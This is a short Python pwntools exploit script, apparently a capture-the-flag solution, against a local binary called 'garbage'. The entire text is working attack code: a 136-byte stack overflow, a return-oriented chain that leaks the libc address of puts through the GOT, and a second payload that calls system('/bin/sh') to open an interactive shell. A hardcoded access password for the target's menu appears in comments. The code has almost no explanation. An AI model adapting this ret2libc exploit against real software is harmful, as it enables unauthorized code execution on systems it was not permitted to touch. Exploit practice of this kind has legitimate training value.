# Exploit author: Chris Hong 
# Date: 7/14/19
# Note: This is the manually calculated buffer overflow 

from pwn import *
context(terminal=['tmux', 'new-window'])
p = process('./garbage')

context(os="linux", arch="amd64")
log.info("Mapping binaries of garbage program")


#401050: ff 25 d2 2f 00 00 jmpq  *0x2fd2(%rip)  # 404028 <puts@GLIBC_2.2.5>
plt_main = p64(0x401619)
plt_put = p64(0x401050)
got_put = p64(0x404028)
#Gotten from ropper (ropper --file garbage --search "pop rdi")
pop_rdi = p64(0x40179b)
junk = "C"*136

payload = junk + pop_rdi + got_put + plt_put + plt_main

#Enter access password: N3veRF3@r1iSh3r3!
#access granted.
#[+] W0rM || Control Application
#[+] ---------------------------
#Select Option
#1: Check Balance
#2: Launch
#3: Cancel
#4: Exit
#> 4

p.sendline(payload)
p.recvuntil("denied.")
leaked_puts = p.recv()[:8].strip().ljust(8, "\x00")
log.success("Leaked puts@GLIBCL: " + str(leaked_puts))
leaked_puts = u64(leaked_puts)


pop_rdi = p64(0x40179b)
libc_put = 0x71910
libc_sys = 0x449c0
libc_sh = 0x181519

offset = leaked_puts - libc_put
sys = p64(offset + libc_sys)
sh = p64(offset + libc_sh) 

payload2 = junk + pop_rdi + sh + sys

p.sendline(payload2)

#raw_input()
p.interactive()
